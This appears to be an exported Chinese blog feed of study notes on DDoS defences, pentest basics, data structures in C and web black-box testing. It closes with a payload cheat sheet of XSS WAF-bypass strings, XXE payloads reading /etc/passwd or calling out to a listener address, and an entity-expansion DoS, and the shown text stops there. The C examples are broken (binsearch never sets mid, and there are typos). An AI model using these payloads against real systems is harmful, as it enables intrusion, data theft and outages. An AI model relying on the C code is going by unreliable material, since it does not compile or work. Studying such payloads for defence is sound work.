</p><p>3、利用协议的攻击。</p><p>该类攻击则是利用某些协议的特性或者利用了安装在受害者机器上的协议中存在的漏洞来耗尽它的大量资源。典型的利用协议攻击的例子是TCP SYN攻击。 [4] </p><p>4、畸形数据包攻击。</p><p>攻击者通过向受害者发送不正确的IP地址的数据包，导致受害系统崩溃。畸形数据包攻击可分为两种类型：IP地址攻击和IP数据包属性攻击。 [4] </p><p>三、基于攻击速率分类</p><p>DDoS攻击从基于速率上进行分类，可以分为持续速率和可变速率的攻击。持续速率的攻击是指只要开始发起攻击，就用全力不停顿也不消减力量。像这种攻击的影响是非常快的。可变速率的攻击，从名字就可以看出，用不同的攻击速率，基于这种速率改变的机制，可以把这种攻击分为增加速率和波动的速率。 [4] </p><p>四、基于影响力进行分类</p><p>DDoS攻击从基于影响力方面可以分为网络服务彻底崩溃和降低网络服务的攻击。服务彻底崩溃的攻击将导致受害者的服务器完全拒绝对客户端提供服务。降低网络服务的攻击，消耗受害者系统的一部分资源，这将延迟攻击被发现的时间，同时对受害者造成一定的破坏。 [4] </p><p>五、基于入侵目标分类</p><p>DDoS攻击从基于入侵目标，可以将DDoS攻击分为带宽攻击和连通性攻击，带宽攻击通过使用大量的数据包来淹没整个网络，使得有效的网络资源被浪费，合法用户的请求得不到响应，大大降低了效率。而连通性攻击是通过发送大量的请求来使得计算机瘫痪，所有有效的操作系统资源被耗尽，导致计算机不能够再处理合法的用户请求。 [4] </p><p>六、基于攻击路线分类</p><p>1、直接攻击：攻击者和主控端通信，主控端接到攻击者的命令后，再控制代理端向受害者发动攻击数据流。代理端向受害者系统发送大量的伪IP地址的网络数据流，这样攻击者很难被追查到。 [4] </p><p>2、反复式攻击通过利用反射体，发动更强大的攻击流。<a href="https://baike.baidu.com/item/反射体/1614339?fromModule=lemma_inlink">反射体</a>是任何一台主机只要发送一个数据包就能收到一个数据包，反复式攻击就是攻击者利用中间的<a href="https://baike.baidu.com/item/网络节点/9338583?fromModule=lemma_inlink">网络节点</a>发动攻击。 [4] </p><p>七、基于攻击特征分类</p><p>从攻击特征的角度，可以将DDoS攻击分为攻击行为特征可提取和攻击行为特征不可提取两类。攻击行为特征可提取的DDoS攻击又可以细分为可过滤型和不可过滤型。可过滤型的DDoS攻击主要指那些使用畸形的非法数据包。不可过滤型DDoS攻击通过使用精心设计的数据包，模仿合法用户的正常请求所用的数据包，一旦这类数据包被过滤将会影响合法用户的正常使用。 [4]</p></blockquote><p>以上来自百度百科（没想到吧哈哈哈哈<img src="https://img2.baidu.com/it/u=3863236755,305052694&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=300&amp;h=300" alt="img">)</p><h6 id="DDoS的工作原理"><a href="#DDoS的工作原理" class="headerlink" title="DDoS的工作原理"></a>DDoS的工作原理</h6><p>在DDoS共计期间，一系列机器人活着僵尸网络会用HTTP请求和流量攻占网站或服务。从本质上来讲，在攻击期间会有多台计算机攻击一台计算机，导致将合法用户推出。因此网络可能会延迟或中断一段时间。</p><p>在共计期间，黑客可能会深入数据库以访问各种敏感信息。DDoS攻击可以利用安全漏洞冰攻击可通过Internet公开访问的任何终结点。</p><p>拒绝服务攻击可能会持续几小时，甚至几天。这些网络攻击还可能在一次攻击中造成多项破坏。个人和企业设备都容易受到此类攻击。</p><h4 id="1-防护软件-硬件Waf-Web应用防火墙-Web服务器限制单IP固定时间段的登陆频率"><a href="#1-防护软件-硬件Waf-Web应用防火墙-Web服务器限制单IP固定时间段的登陆频率" class="headerlink" title="1.防护软件/硬件Waf(Web应用防火墙)/Web服务器限制单IP固定时间段的登陆频率"></a>1.防护软件/硬件Waf(Web应用防火墙)/Web服务器限制单IP固定时间段的登陆频率</h4><ul><li>所以可以使用WAF来实现对某个IP访问过高时将其IP加入黑名单隔离</li><li>通过Nginx等web服务器可以实现限制单IP固定时间段的登录频率，也就是限制流量</li><li>可以防爆破的同时一定程度上防止DDoS攻击</li></ul><h6 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.runoob.com/w3cnote/nginx-setup-intro.html</span><br></pre></td></tr></table></figure><p>但是这样也有问题，攻击者可以通过代理池的方式绕过</p><p>代理池：一组受管理的代理，代理池充当计算机和网络之间的中介，将请求路由到网站并显示自己的IP地址，同时隐藏自己的IP</p><ul><li>（因为代理池中有很多的IP地址，相当于你连接到代理池，再从代理池换了一个IP连接到你所要去的网站）</li></ul><h4 id="2-WebApp限制单用户固定时间段的登录频率"><a href="#2-WebApp限制单用户固定时间段的登录频率" class="headerlink" title="2.WebApp限制单用户固定时间段的登录频率"></a>2.WebApp限制单用户固定时间段的登录频率</h4><p>就跟手机密码试错一样，错误几次以上就锁账号，能一定程度上的防止</p><p>但这样也有问题，可以故意使用错误密码使得原来的用户也不能登陆</p><h5 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h5><p>又称之为重播攻击，是指攻击者发送一个目的主机已接收过得包来达到欺骗系统的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实他的意思就是攻击者把服务器收到过的数据包反复请求，由于是已经拒收岛国的数据包，如果服务器防范不当的话接口可以通过身份验证，就跟pikachu的验证码绕过一样，重发的包是服务器接受过的，而且验证码还没变，所以可以通过爆破账号密码来进行攻击</span><br></pre></td></tr></table></figure><h4 id="3-图片验证码（扭曲-干扰-数字-字母-阴影-随机颜色）"><a href="#3-图片验证码（扭曲-干扰-数字-字母-阴影-随机颜色）" class="headerlink" title="3.图片验证码（扭曲+干扰+数字+字母+阴影+随机颜色）"></a>3.图片验证码（扭曲+干扰+数字+字母+阴影+随机颜色）</h4><p>我相信各位登录王网站的时候肯定会输入过一些验证码，像是这样的</p><p><img src="https://s2.loli.net/2023/03/21/3jRAkKbfhrN2pO6.gif" alt="44770e5bc70fa816a0df9da07816e28c.gif"></p><p>这样是为了防止重放攻击</p><p><em>但是这样的问题就是验证码不能放在session中，因为重放攻击每次的session都不变，去session中核对验证码每次都是不变的</em></p><h5 id="session-PHP语言"><a href="#session-PHP语言" class="headerlink" title="session,PHP语言"></a>session,PHP语言</h5><blockquote><p>string <strong>session_cache_limiter</strong> ( [string cache_limiter]) 函数返回当前缓存限制的名字. 如果指定了 cache_limiter， 当前的缓存限制的名字被改为新值。</p></blockquote><p>​                                                ———————————来自百度百科</p><p>但实际上吧，session和cookie功能其实差不多，他们的区别在于session记录在服务器，cookie记录在客户端</p><p>session就是在服务器内开辟一块内存，这个session只允许当前服务器使用，即使是新开了一个服务器也无法使用当前这个session</p><p>（硬要说的话，就像是你通过steam要买一个游戏，你在购物车选好以后要跳付款界面，没有session的话付款界面怎么知道你要付的款项呢（如果不想知道的话我感觉表票也不是不能接受））</p><p>那问题来了，浏览器怎么知道你应该付的是这个款项而不是其他的呢，比如你买一个永劫，但给你跳转了一个尼尔机械纪元的钱，这不血亏。（反过来我倒是可以小小的将就一下（&lt;^__^&gt;）</p><p>其实这种情况是不可能出现的，当访问一个页面的时候，会给服务器一个unique的号码，而这个号码也会同时共享给session,当访问第二个页面的时候，会将这个号码同步传递到第二个页面。</p><p>4.IP段黑白名单</p><p>就是Ban了某些IP</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> 皮卡丘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试CH8</title>
      <link href="/2025/01/08/2023%E5%B9%B412%E6%9C%8818%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH8/"/>
      <url>/2025/01/08/2023%E5%B9%B412%E6%9C%8818%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH8/</url>
      
        <content type="html"><![CDATA[<h5 id="网络渗透测试行业标准"><a href="#网络渗透测试行业标准" class="headerlink" title="网络渗透测试行业标准"></a>网络渗透测试行业标准</h5><ul><li>前期与客户的交流阶段‘</li><li>情报的收集阶段</li><li>威胁建模阶段</li><li>漏洞分析阶段</li><li>漏洞利用阶段</li><li>后渗透攻击阶段</li><li>报告阶段</li></ul><p>SAM破解</p><p>kon-boot系统启动盘（）</p><p>挑战/响应认证方式（challenge/response）</p><p>免杀</p><p>双向远程控制连接</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/2025/01/08/2023%E5%B9%B410%E6%9C%8824%E6%97%A5-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2025/01/08/2023%E5%B9%B410%E6%9C%8824%E6%97%A5-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>数据结构是一门研究数据组织存储和运算的一般方法的学科。</p><h3 id="数据结构中有几种类型"><a href="#数据结构中有几种类型" class="headerlink" title="数据结构中有几种类型"></a>数据结构中有几种类型</h3><ul><li>线性表</li></ul><p>​    逻辑特征：一对一</p><p>​    直接前驱，直接后驱，开始结点，终端结点</p><ul><li><p>树</p><p>逻辑特征：一对多</p><p>有且只有一个根节点，</p><p>除根节点外，每个节点都有且只有一个唯一的前驱</p><p>除叶子结点外，每个节点都有后继结点</p></li><li><p>图</p><p>逻辑结构：多对多</p></li></ul><h3 id="数据结构的存储类型分类："><a href="#数据结构的存储类型分类：" class="headerlink" title="数据结构的存储类型分类："></a>数据结构的存储类型分类：</h3><p>顺序存储：按照给定的顺序进行存储</p><p>链式存储：使用链的形式进行存储</p><p>散列存储</p><p>索引存储</p><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>一个算法是由若干的指令组成的有序数组</p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ul><li>有穷性：算法在有穷的步数中结束，每一步都在有穷的时间内完成</li><li>确定性：每条指令的含义都必须明确</li><li>可行性：能够由机器人或者计算机或者人完成</li></ul><h3 id="检验一个算法的好坏"><a href="#检验一个算法的好坏" class="headerlink" title="检验一个算法的好坏"></a>检验一个算法的好坏</h3><ul><li>正确性：能否满足预先的功能和性能要求</li><li>可读性：算法是够可读，易读</li><li>健壮性：当输入非法时，算法是否能及时给出反馈</li><li>时间效率和空间效率：两个复杂度</li></ul><h3 id="时间复杂度和空间复杂度"><a href="#时间复杂度和空间复杂度" class="headerlink" title="时间复杂度和空间复杂度"></a>时间复杂度和空间复杂度</h3><p>时间复杂度：执行当前算法所消耗的时间</p><p>空间复杂度：执行当前算法所占用的内存</p><p><a href="https://www.yuque.com/vernus-u2vmo/tgvyrt/to9tln8g55kvhl0y?singleDoc#">https://www.yuque.com/vernus-u2vmo/tgvyrt/to9tln8g55kvhl0y?singleDoc#</a></p><h2 id="线性表和链表"><a href="#线性表和链表" class="headerlink" title="线性表和链表"></a>线性表和链表</h2><h4 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h4><p>基本概念：一个数据元素的有序集，其基本特征</p><ul><li>集合中存在唯一的一个第一个元素</li><li>集合中存在唯一的一个最后一个元素</li><li>除第一个元素外都存在为一个直接前驱</li><li>除最后一个元素外都存在唯一的一个直接后驱</li></ul><h5 id="顺序表的建立"><a href="#顺序表的建立" class="headerlink" title="顺序表的建立"></a>顺序表的建立</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">typedef int Datatype；</span><br><span class="line">struct List</span><br><span class="line">&#123;</span><br><span class="line">int MAX;</span><br><span class="line">int n;</span><br><span class="line">DataType *elem;</span><br><span class="line">&#125;;</span><br><span class="line">typedef struct List*SeqList;</span><br></pre></td></tr></table></figure><h5 id="顺序表的判空"><a href="#顺序表的判空" class="headerlink" title="顺序表的判空"></a>顺序表的判空</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SeqList SetNullList_seq(int m)</span><br><span class="line">&#123;</span><br><span class="line">    SeqList slist=(SeqList)malloc(sizeof(struct List));</span><br><span class="line">    if(slist!=NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem=(DataType*)malloc(sizeof(DataType)*m);</span><br><span class="line">        if(slist-&gt;elem)</span><br><span class="line">        &#123;</span><br><span class="line">            slist-&gt;Max=m;</span><br><span class="line">            slist-&gt;n=0;</span><br><span class="line">            return(slist);</span><br><span class="line">        &#125;</span><br><span class="line">        else free(slist);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;ALLoc failure!\n&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="顺序表的插入"><a href="#顺序表的插入" class="headerlink" title="顺序表的插入"></a>顺序表的插入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int InsertPre_seq(SeqList slist,int p,DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    int q;</span><br><span class="line">    if(slist-&gt;n&gt;=slist-&gt;Max)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;overflow&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if(p&lt;0||p&gt;slist-&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;not exist!\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    for(q=slist-&gt;n-1;q&gt;=p;q--)</span><br><span class="line">    slist-&gt;elem[q+1]=slist-&gt;elem[q];</span><br><span class="line">    slist-&gt;elem[p]=x;</span><br><span class="line">    slist-&gt;n=slist-&gt;n+1;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="顺序表的删除"><a href="#顺序表的删除" class="headerlink" title="顺序表的删除"></a>顺序表的删除</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int DelIndex_seq(SeqList slist,int p)</span><br><span class="line">&#123;</span><br><span class="line">    int q;</span><br><span class="line">    if(p&lt;0||p&gt;=slist-&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Not exist&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">     &#125; </span><br><span class="line">     for(q=p;q&lt;slist-&gt;n-1;q++)</span><br><span class="line">     &#123;</span><br><span class="line">         slist -&gt;elem[q]=slist -&gt;elem[q+1];</span><br><span class="line">     &#125;</span><br><span class="line">     slist -&gt;n=slist-&gt;n-1;</span><br><span class="line">     return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int binsearch(SeqList slist,int key,int *pos)</span><br><span class="line">&#123;</span><br><span class="line">    int index=1;int mid;</span><br><span class="line">    int low = 0;int high=slist-&gt;n-1;</span><br><span class="line">    while(low&lt;=high)</span><br><span class="line">    &#123;</span><br><span class="line">        if(slist-&gt;ekem[mid]==key)</span><br><span class="line">        &#123;</span><br><span class="line">            *pos=mid;</span><br><span class="line">            printf(&quot;已经找到，共进行%d次比较\n&quot;，index);</span><br><span class="line">            printf(&quot;要找到的数据%d在位置%d上\n&quot;，key,mid);</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if (slist-&gt;elem[mid]&gt;key)</span><br><span class="line">        &#123;</span><br><span class="line">            high = mid -1;</span><br><span class="line">        &#125;</span><br><span class="line">        else low = mid + 1;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    *pos = llow;</span><br><span class="line">    printf(&quot;没找到，共进行%d次比较\n&quot;，index-1)；</span><br><span class="line">    printf(&quot;可以在%d上插入位置\n&quot;，*pos);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><h4 id="特性："><a href="#特性：" class="headerlink" title="特性："></a>特性：</h4><p>​    后进先出</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>​    顺序栈</p><p>​    链栈</p><h4 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h4><p>前缀中缀表达式</p><p><a href="https://www.yuque.com/vernus-u2vmo/tgvyrt/zh4geied5wd2ldpm?singleDoc#">https://www.yuque.com/vernus-u2vmo/tgvyrt/zh4geied5wd2ldpm?singleDoc#</a> 《栈的应用》</p><p>计算器</p><p>单调栈（例题——洛谷《音乐会的等待》）</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><h4 id="特性：-1"><a href="#特性：-1" class="headerlink" title="特性："></a>特性：</h4><p>先进先出，跟栈相反</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="单队列"><a href="#单队列" class="headerlink" title="单队列"></a>单队列</h5><p>假溢出</p><h5 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h5><p>需要一个闲置的空区</p><p>可以解决顺序队列中的假溢出和越界问题</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑盒知识梳理</title>
      <link href="/2025/01/07/2025%E5%B9%B41%E6%9C%8807%E6%97%A5-%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B%E9%BB%91%E7%9B%92%E7%9A%84%E6%89%8B%E6%B3%95/"/>
      <url>/2025/01/07/2025%E5%B9%B41%E6%9C%8807%E6%97%A5-%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B%E9%BB%91%E7%9B%92%E7%9A%84%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="xxe—-hacking-wite-excel变种版"><a href="#xxe—-hacking-wite-excel变种版" class="headerlink" title="xxe— hacking wite excel变种版"></a>xxe— hacking wite excel变种版</h2><p>现在excel本质上就是一个包含xml文档的压缩文件，和docx,ppt一样，这就可以被称之为OOxml,即<br>office open xml</p><p>所以这有什么问题呢，就是说当我们要在某个地方允许上传这种ooxml的时候，如果没有安全配置器，那么这个存在xxe是必然的</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ mkdir xml &amp;&amp; cd xml           </span><br><span class="line">                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/xml]</span><br><span class="line">└─$ unzip ../<span class="number">0.</span>xlsx</span><br><span class="line">Archive:  ../<span class="number">0.</span>xlsx</span><br><span class="line">  inflating: [Content_Types].xml     </span><br><span class="line">  inflating: _rels/.rels             </span><br><span class="line">  inflating: docProps/app.xml        </span><br><span class="line"> extracting: [trash]/<span class="number">0000.</span>dat        </span><br><span class="line">  inflating: xl/_rels/workbook.xml.rels  </span><br><span class="line">  inflating: xl/styles.xml           </span><br><span class="line">  inflating: xl/theme/theme1.xml     </span><br><span class="line">  inflating: xl/workbook.xml         </span><br><span class="line">  inflating: xl/worksheets/sheet1.xml  </span><br><span class="line">  inflating: docProps/core.xml  </span><br></pre></td></tr></table></figure><p>创建一个崭新的excel，虽然你可能在里面键入一些文本，但这是无关紧要的，</p><p>要使用的攻击文件也会因为所使用的库而有所不同。大部分解析工作通常是从<code>xl/workbook.xml</code>开始的，这个文件包含了所有的工作表的信息，包括工作表的名称和位置。</p><p>各种工作表也可以在<code>xl/worksheets</code>目录下找到，这里的文件包含了工作表的内容，这些内容是以xml格式存储的。</p><p>所以我认为可以在这个文件中下功夫</p><p>—2025-1-7补充</p><pre><code>其实后面我看了看别人的，不一定非要在workbook.xml,解压后的[Content_Types].xml也是可以下手</code></pre><p>看了看佬的<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;dnslog的地址或者说你监听的地址/&quot;</span>&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><br>然后压缩为xslx上传</p><p>可以看看这篇<br><a href="https://cn-sec.com/archives/248520.html">xxe-excel</a></p><h2 id="ssrf-in-pdf"><a href="#ssrf-in-pdf" class="headerlink" title="ssrf-in-pdf"></a>ssrf-in-pdf</h2><p>如果你访问的某个网站存在下列功能之一，那就可能存在ssrf了</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">打印pdf报告</span><br><span class="line">生成报告文件</span><br><span class="line">提交数字签名</span><br><span class="line">····</span><br></pre></td></tr></table></figure><p>因为都会生成pdf形式的文件，而里面的pdf解析器/js会获取其中数据并将其添加到网页页面中，</p><p><a href="https://cn-sec.com/archives/2953070.html">在 PDF HTML注入中利用SSRF</a></p><p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">PDF解析器html/XSS 实现SSRF</a></p><h2 id="IDOR"><a href="#IDOR" class="headerlink" title="IDOR"></a>IDOR</h2><p>简单来说就是比如<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//insecure-website.com/customer_account?customer_number=132355</span></span><br></pre></td></tr></table></figure><br>这个后面的132355就是idor，我们只需要更改后面的customer_number就可以绕过访问控制查看其它客户的记录</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight plaintext"><figcaption><span>waf</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert&amp;#0000000040document.cookie)&gt; </span><br><span class="line">&lt;svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b&gt; </span><br><span class="line">&lt;Svg Only=1 OnLoad=confirm(atob(&quot;Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ==&quot;))&gt; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>WAF：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;details/open/ontoggle=confirm(&#x27;XSS&#x27;)&gt;</span><br><span class="line">6&#x27;%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/</span><br><span class="line">;window/*aabb*/[&#x27;al&#x27;%2b&#x27;ert&#x27;](document./*aabb*/Location);</span><br><span class="line">&quot;&gt;%0D%0A%0D%0A&lt;x &#x27;=&quot;foo&quot;&gt;&lt;x foo=&#x27;&gt;&lt;img src=x onerror=javascript:alert(cloudfrontbypass)//&gt;</span><br></pre></td></tr></table></figure><h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ELEMENT foo (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ELEMENT foo (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>示例）</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY ac SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;&lt;result&gt;&amp;ac;&lt;/result&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ELEMENT foo (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;https://www.example.com/text.txt&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>实体扩展 - DOS）</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 